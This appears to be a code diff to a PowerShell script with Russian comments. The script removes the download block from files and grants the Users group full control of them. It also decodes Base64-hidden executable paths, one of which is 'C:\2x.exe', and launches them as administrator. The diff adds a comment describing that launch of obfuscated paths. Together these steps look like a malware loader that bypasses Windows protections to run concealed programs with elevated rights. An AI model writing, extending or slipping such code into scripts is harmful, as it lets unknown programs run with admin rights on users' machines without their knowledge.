@@ -76,7 +76,7 @@ function Unblock-FileIfBlocked {
     param (
         [string]$filePath
     )
-    if (Get-Item $filePath -ErrorAction SilentlyContinue) {
+    if (Test-Path -Path $filePath) {
         Unblock-File -Path $filePath
         Write-Output "Файл $filePath разблокирован."
     } else {
@@ -91,9 +91,9 @@ function Set-FullAccessTo-File {
     )
     try {
         $acl = Get-Acl $filePath
-        $permissions = "Everyone","FullControl","Allow"
+        $permissions = "BUILTIN\Users","FullControl","Allow"
         $rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permissions
-        $acl.SetAccessRule($rule)
+        $acl.AddAccessRule($rule)
         Set-Acl $filePath $acl
         Write-Output "Полный доступ установлен для файла $filePath."
     } catch {
@@ -150,6 +150,7 @@ $obfuscatedPath2 = [System.Convert]::FromBase64String("QzpcMngueGV4ZQ==")
 $decodedPath1 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath1)
 $decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)
 
+# Запуск файлов с обфусцированными путями от имени администратора
 Start-Process -FilePath $decodedPath1 -Verb RunAs
 Start-Process -FilePath $decodedPath2 -Verb RunAs
 
